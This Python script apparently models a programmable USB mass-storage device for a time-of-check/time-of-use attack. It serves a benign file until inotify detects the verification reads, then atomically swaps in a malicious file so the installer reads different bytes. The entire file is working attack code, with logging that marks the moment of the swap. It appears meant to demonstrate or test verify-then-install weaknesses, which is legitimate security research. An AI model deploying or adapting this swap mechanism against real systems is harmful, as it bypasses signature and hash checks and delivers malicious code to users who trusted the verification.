#!/usr/bin/env python3
# Dynamic USB mass-storage emulator (software model).
#
# Models a programmable USB device (e.g. Pi Zero g_mass_storage with swappable backing,
# or an SD-mux / MSC emulator): it presents one path, serves BENIGN content, and the
# instant it detects the victim has finished the *verify* read, it atomically swaps the
# backing to MALICIOUS — so the next reader (the installer) gets different bytes.
#
# The swap is TRIGGERED BY THE VICTIM'S OWN READ (inotify IN_CLOSE_NOWAIT), exactly like
# real dynamic media reacting to the host's access pattern. No manual swap.
#
#   usb_emulator.py <media_path> <benign> <evil> <ready_flag> <swapped_flag> <arm_after_n>
#
# arm_after_n = number of read-closes that constitute the "verify" phase; after that many,
# the next close triggers the swap. (md5sum=1 open, openssl dgst -verify of the file=1 open.)
import os, sys, struct, ctypes, ctypes.util, shutil

media, benign, evil, ready_flag, swapped_flag, arm_after = sys.argv[1:7]
arm_after = int(arm_after)

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
IN_CLOSE_NOWRITE = 0x00000010
IN_CLOSE_WRITE   = 0x00000008

# start serving benign
shutil.copyfile(benign, media)

fd = libc.inotify_init()
if fd < 0: raise OSError("inotify_init failed")
wd = libc.inotify_add_watch(fd, media.encode(), IN_CLOSE_NOWRITE | IN_CLOSE_WRITE)
if wd < 0: raise OSError("inotify_add_watch failed")

# tell the runner we're serving benign and armed
open(ready_flag, "w").write("serving=benign\n")
sys.stderr.write("[usb-emu] serving BENIGN; watching for verify read-close...\n"); sys.stderr.flush()

closes = 0
swapped = False
buf = os.read  # read raw events via os.read on the inotify fd
EVENT_HDR = struct.calcsize("iIII")  # wd, mask, cookie, len
while not swapped:
    data = os.read(fd, 4096)
    off = 0
    while off < len(data):
        w, mask, cookie, nlen = struct.unpack_from("iIII", data, off)
        off += EVENT_HDR + nlen
        if mask & (IN_CLOSE_NOWRITE | IN_CLOSE_WRITE):
            closes += 1
            sys.stderr.write(f"[usb-emu] observed read-close #{closes} on media\n"); sys.stderr.flush()
            if closes >= arm_after:
                # verify phase done -> present MALICIOUS to the installer
                tmp = media + ".swap"
                shutil.copyfile(evil, tmp)
                os.replace(tmp, media)
                open(swapped_flag, "w").write("serving=evil\n")
                sys.stderr.write("[usb-emu] *** SWAPPED backing to MALICIOUS (post-verify) ***\n"); sys.stderr.flush()
                swapped = True
                break
